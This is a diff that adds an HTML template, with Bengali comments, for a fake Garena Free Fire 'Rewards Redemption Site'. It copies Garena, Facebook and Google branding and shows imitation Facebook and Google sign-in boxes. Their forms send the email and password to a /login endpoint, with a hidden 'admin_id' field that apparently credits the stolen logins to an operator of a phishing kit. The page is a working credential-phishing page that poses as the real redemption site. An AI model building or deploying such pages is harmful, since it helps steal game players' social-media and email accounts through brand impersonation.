@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Rewards</title>
+    <style>
+        /* CSS কোডে কোনো পরিবর্তন নেই, তাই সংক্ষিপ্ত রাখা হলো */
+        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #000; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: url('https://img.gurugamer.com/resize/1200x-/2021/01/21/garena-free-fire-redeem-code-7a60.jpg'); background-size: cover; background-position: center; }
+        .main-container { width: 100%; max-width: 420px; text-align: center; background-color: rgba(15, 15, 15, 0.75); padding: 25px; border-radius: 12px; box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); backdrop-filter: blur(5px); margin: 20px; }
+        .header img { width: 180px; margin-bottom: 10px; }
+        .main-title { font-size: 28px; font-weight: 700; color: #FFC107; }
+        .main-description { font-size: 16px; margin-bottom: 25px; color: #eee; }
+        .login-buttons { display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-bottom: 25px; }
+        .login-buttons img { width: 55px; height: 55px; cursor: pointer; transition: transform 0.2s ease, box-shadow 0.2s ease; border-radius: 50%; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); }
+        .login-buttons img:hover { transform: scale(1.1); box-shadow: 0 6px 12px rgba(255, 193, 7, 0.4); }
+        .important-notice { background-color: rgba(255, 255, 255, 0.95); color: #333; padding: 15px; border-radius: 8px; text-align: left; font-size: 14px; }
+        .important-notice h4 { margin-top: 0; font-size: 16px; color: #000; }
+        .important-notice ol { padding-left: 20px; margin: 0; }
+        .important-notice li { margin-bottom: 8px; }
+        .highlight { color: #D32F2F; font-weight: bold; }
+        .footer { margin-top: 20px; font-size: 12px; color: #bbb; }
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px); animation: fadeIn 0.3s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .modal-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 20px; width: 90%; max-width: 360px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .modal-content input[type="text"], .modal-content input[type="email"], .modal-content input[type="password"] { width: 100%; padding: 14px; margin: 8px 0; display: inline-block; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+        .modal-content button { width: 100%; padding: 14px 20px; margin: 10px 0; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; font-weight: bold; color: white; }
+        .close { position: absolute; right: 15px; top: 10px; color: #aaa; font-size: 28px; font-weight: bold; cursor: pointer; }
+        #facebookModal .modal-content { background-color: #fff; color: #1c1e21; }
+        #facebookModal .fb-logo { width: 120px; margin-bottom: 15px; }
+        #facebookModal button { background-color: #1877F2; }
+        #facebookModal .fb-link { color: #1877F2; text-decoration: none; font-size: 14px; margin-top: 15px; display: block; }
+        #googleModal .modal-content { background-color: #fff; color: #202124; text-align: left; padding: 30px; }
+        #googleModal .google-logo { width: 80px; display: block; margin: 0 auto 10px auto; }
+        #googleModal h3 { font-size: 24px; font-weight: 400; margin: 0; text-align: center; }
+        #googleModal p { font-size: 16px; text-align: center; margin-bottom: 20px; }
+        #googleModal button { background-color: #1a73e8; float: right; width: auto; padding: 8px 24px; font-size: 14px; }
+        #googleModal .google-links { margin-top: 50px; font-size: 14px; }
+        #googleModal .google-links a { text-decoration: none; color: #1a73e8; font-weight: 600; }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="header"><img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/logo_small_foot.jpg" alt="Free Fire Logo"></div>
+        <h2 class="main-title">Rewards Redemption Site</h2>
+        <p class="main-description">Please log in to continue.</p>
+        <div class="login-buttons">
+            <!-- onclick ইভেন্টগুলো এখন মডাল আইডি পাস করবে -->
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/facebook.png" alt="Facebook" onclick="showLoginModal('facebookModal')">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/google.png" alt="Google" onclick="showLoginModal('googleModal')">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/vk.png" alt="VK">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/apple.png" alt="Apple">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/twitter.png" alt="Twitter">
+        </div>
+        <div class="important-notice">
+            <h4>Important Notice:</h4>
+            <ol>
+                <li>Redemption code has <span class="highlight">12/16</span> characters.</li>
+                <li>Item rewards are shown in <span class="highlight">[vault]</span> tab.</li>
+                <li>Any expired codes cannot be redeemed.</li>
+                <li>Please contact customer service if you encounter any issue.</li>
+                <li>You will not be able to redeem with guest accounts.</li>
+            </ol>
+        </div>
+        <div class="footer"><p>Copyright © Garena International. All rights Reserved.</p></div>
+    </div>
+
+    <!-- Facebook Login Modal -->
+    <div id="facebookModal" class="modal">
+      <div class="modal-content" style="text-align: center;">
+        <span class="close" onclick="closeModal('facebookModal')">&times;</span>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="fb-logo">
+        
+        <!-- *** গুরুত্বপূর্ণ পরিবর্তন এখানে *** -->
+        <form action="/login" method="post">
+            <input type="hidden" name="admin_id" value="{{ admin_id }}">
+            <input type="hidden" name="source" value="Facebook">
+            <input type="text" name="email" placeholder="Email address or phone number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <a href="#" class="fb-link">Forgotten password?</a>
+        </form>
+        
+      </div>
+    </div>
+
+    <!-- Google Login Modal -->
+    <div id="googleModal" class="modal">
+        <div class="modal-content">
+          <span class="close" onclick="closeModal('googleModal')">&times;</span>
+          <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" class="google-logo">
+          <h3>Sign in</h3>
+          <p>to continue to Garena Free Fire</p>
+          
+          <!-- *** গুরুত্বপূর্ণ পরিবর্তন এখানে *** -->
+          <form action="/login" method="post">
+            <input type="hidden" name="admin_id" value="{{ admin_id }}">
+            <input type="hidden" name="source" value="Google">
+            <input type="email" name="email" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <div class="google-links">
+                <a href="#">Create account</a>
+                <button type="submit">Sign In</button>
+            </div>
+          </form>
+
+        </div>
+    </div>
+
+    <!-- *** সরলীকৃত JavaScript *** -->
+    <script>
+        function showLoginModal(modalId) {
+            document.getElementById(modalId).style.display = 'block';
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                closeModal(event.target.id);
+            }
+        }
+    </script>
+
+</body>
+</html>
